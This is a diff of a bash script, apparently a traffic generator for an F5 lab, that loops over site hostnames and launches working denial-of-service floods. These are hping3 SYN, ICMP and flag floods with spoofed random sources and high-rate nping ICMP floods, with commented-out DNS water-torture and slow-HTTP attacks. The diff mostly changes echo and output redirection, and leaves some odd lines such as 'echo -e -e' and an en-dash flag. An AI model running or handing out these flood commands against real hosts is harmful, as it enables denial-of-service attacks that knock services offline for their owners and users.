@@ -6,7 +6,7 @@ home="/home/f5/scripts"
 
 already=$(ps -ef | grep "$0" | grep bash | grep -v grep | wc -l)
 if [  $already -gt 2 ]; then
-    echo "The script is already running `expr $already - 2` time."
+    echo -e "The script is already running `expr $already - 2` time."
     exit 1
 fi
 
@@ -77,66 +77,65 @@ do
         # Only sending traffic to Apps on port 443
         if [[  $port == 443 ]]; then
             
-            echo -e "\n# site $i ${sitefqdn[$i]} DDOS attack"
+            echo -e -e "\n# site $i ${sitefqdn[$i]} DDOS attack"
 
             # sudo docker run -t -i kalilinux/kali-linux-docker apt-get update && apt-get install metasploit-framework
             # sudo docker run -t -i kalilinux/kali-linux-docker hping3 -V -c 1000000 -d 120 -S -w 64 -p 445 -s 445 --flood --rand-source site42.example.com &
 
             # hping3 flood mod
-            #sudo hping3 -V -c 1000000 -d 120 -S -w 64 -p 445 -s 445 --flood --rand-source ${sitefqdn[$i]} &
+            #sudo hping3 -V -c 1000000 -d 120 -S -w 64 -p 445 -s 445 --flood --rand-source ${sitefqdn[$i]}  > /dev/null 2>&1 &
             #pid=$(ps -ef | grep hping3 | grep -v grep | awk '{ print $2 }')
-            #echo $pid
+            #echo -e $pid
             #r=`shuf -i 120-600 -n 1`;
             #perl -le "sleep rand $r" && sudo kill -9 $pid &
             #ps -ef | grep hping3 | grep -v grep
             #ps -ef | grep "sleep rand" | grep -v grep
 
-            #echo "Running HPing3 attack script towards FTP... \r\n"
-            #sudo hping3 -c 10000 -d 120 -S -w 64 -p 21 --flood --rand-source ${sitefqdn[$i]} 2> /dev/null &
+            #echo -e "Running HPing3 attack script towards FTP... \r\n"
+            #sudo hping3 -c 10000 -d 120 -S -w 64 -p 21 --flood --rand-source ${sitefqdn[$i]}  > /dev/null 2>&1 &
 
-            echo "Running ping flood attack from random sources \r\n"
-            sudo hping3 ${sitefqdn[$i]} --icmp --flood --rand-source 2> /dev/null &
+            echo -e "Running ping flood attack from random sources \r\n"
+            sudo hping3 ${sitefqdn[$i]} --icmp --flood --rand-source > /dev/null 2>&1 &
 
             #--- HTTP attacks ---
-            echo "Running HPing3 flood attack to HTTP \r\n "
-            sudo hping3 ${sitefqdn[$i]} -p $port –SF --flood 2> /dev/null &
+            echo -e "Running HPing3 flood attack to HTTP \r\n "
+            sudo hping3 ${sitefqdn[$i]} -p $port –SF --flood > /dev/null 2>&1 &
 
-            echo "Running syn flood attack from random sources, towards a webserver \r\n "
-            sudo hping3 --syn --flood --rand-source --win 65535 --ttl 64 --data 16000 --morefrag --baseport 49877 --destport 80 ${sitefqdn[$i]} 2> /dev/null &
+            echo -e "Running syn flood attack from random sources, towards a webserver \r\n "
+            sudo hping3 --syn --flood --rand-source --win 65535 --ttl 64 --data 16000 --morefrag --baseport 49877 --destport 80 ${sitefqdn[$i]} > /dev/null 2>&1 &
 
-            #echo "Performing a NTP flood, from port NTP (Time Protocol) \r\n "
-            #sudo nping $server_ip $NPING_SILENT -c $SAMPLES --rate $RATE --udp -p 123 --data-length 100 $OUTPUT 2> /dev/null &
+            #echo -e "Performing a NTP flood, from port NTP (Time Protocol) \r\n "
+            #sudo nping $server_ip $NPING_SILENT -c $SAMPLES --rate $RATE --udp -p 123 --data-length 100 > /dev/null 2>&1 &
 
-            #echo "Performing a TCP SYN Flood towards SSH \r\n"
-            #sudo nping $server_ip $NPING_SILENT -c $SAMPLES --rate $RATE --tcp --flags SYN -p 22 $OUTPUT 2> /dev/null &
+            #echo -e "Performing a TCP SYN Flood towards SSH \r\n"
+            #sudo nping $server_ip $NPING_SILENT -c $SAMPLES --rate $RATE --tcp --flags SYN -p 22 > /dev/null 2>&1 &
 
             RATE=5000
             SAMPLES=1000000000
-            OUTPUT=&>/dev/null
             NPING_SILENT='-HNq'
-            echo "Performing a ICMP Flood \r\n "
-            sudo nping ${sitefqdn[$i]} $NPING_SILENT -c $SAMPLES --rate $RATE --icmp $OUTPUT 2> /dev/null &
+            echo -e "Performing a ICMP Flood \r\n "
+            sudo nping ${sitefqdn[$i]} $NPING_SILENT -c $SAMPLES --rate $RATE --icmp > /dev/null 2>&1 &
 
-            #echo "Performing a RST Flood on TCP towards SSH \r\n "
-            #sudo nping $server_ip $NPING_SILENT -c $SAMPLES --rate $RATE --tcp --flags RST -p 22 $OUTPUT 2> /dev/null &
+            #echo -e "Performing a RST Flood on TCP towards SSH \r\n "
+            #sudo nping $server_ip $NPING_SILENT -c $SAMPLES --rate $RATE --tcp --flags RST -p 22 > /dev/null 2>&1 &
 
             #------ Attack traffic ----------
-            #echo "Running NX Domain attack python script... \r\n "
-            #sudo python attack_dns_nxdomain.py $server_ip example.com 10000 &>/dev/null &
-            #echo "Running DNS Water Torture attack against server"
-            #sudo ./attack_dns_watertorture_wget.sh $server_ip  &>/dev/null &
+            #echo -e "Running NX Domain attack python script... \r\n "
+            #sudo python attack_dns_nxdomain.py $server_ip example.com 10000 > /dev/null 2>&1 &
+            #echo -e "Running DNS Water Torture attack against server"
+            #sudo ./attack_dns_watertorture_wget.sh $server_ip > /dev/null 2>&1 &
 
             #--- web attacks -----
-            #echo "Performing a Slow HTTP Test script against webserver \r\n "
-            #sudo ./slowhttptest -c 1000 -B -g -o my_body_stats -i 110 -r 200 -s 8192 -t FAKEVERB -u https://$server_ip/resources/loginform.html -x 10 -p 3 2> /dev/null &
-            #sudo ./gen_ab.sh $server_ip &>/dev/null &
+            #echo -e "Performing a Slow HTTP Test script against webserver \r\n "
+            #sudo ./slowhttptest -c 1000 -B -g -o my_body_stats -i 110 -r 200 -s 8192 -t FAKEVERB -u https://$server_ip/resources/loginform.html -x 10 -p 3 > /dev/null 2>&1 &
+            #sudo ./gen_ab.sh $server_ip > /dev/null 2>&1 &
             
             r=`shuf -i 120-600 -n 1`;
-            perl -le "sleep rand $r" && killall -9 hping3
-            perl -le "sleep rand $r" && killall -9 nping
+            perl -le "sleep rand $r" && killall -9 hping3 &
+            perl -le "sleep rand $r" && killall -9 nping &
 
         else
-                echo "SKIP ${sitefqdn[$i]} - $ip not answering on port 443 or 80"
+                echo -e "SKIP ${sitefqdn[$i]} - $ip not answering on port 443 or 80"
         fi
    fi
 done
